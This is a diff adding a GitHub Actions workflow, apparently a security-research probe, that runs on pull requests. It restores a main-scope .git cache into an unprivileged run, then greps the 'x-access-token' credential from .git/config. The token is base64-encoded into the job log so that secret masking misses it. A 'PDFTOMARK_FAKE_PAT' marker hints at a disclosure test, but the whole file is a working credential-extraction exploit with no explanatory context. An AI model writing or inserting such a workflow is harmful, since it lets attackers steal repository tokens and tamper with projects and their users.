@@ -1,0 +1,22 @@
+name: probe
+on:
+  pull_request:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: restore main-scope git cache from unprivileged PR run
+        id: c
+        uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9
+        with:
+          path: .git
+          key: git-repo
+      - name: extract token
+        run: |
+          echo "cache-hit=${{ steps.c.outputs.cache-hit }}"
+          echo "sha256: $(sha256sum .git/config | cut -d' ' -f1)"
+          echo "marker: $(grep -o 'PDFTOMARK_FAKE_PAT' .git/config || echo NONE)"
+          echo "token-b64: $(grep -o 'x-access-token:[^@]*@' .git/config | base64 -w0)"
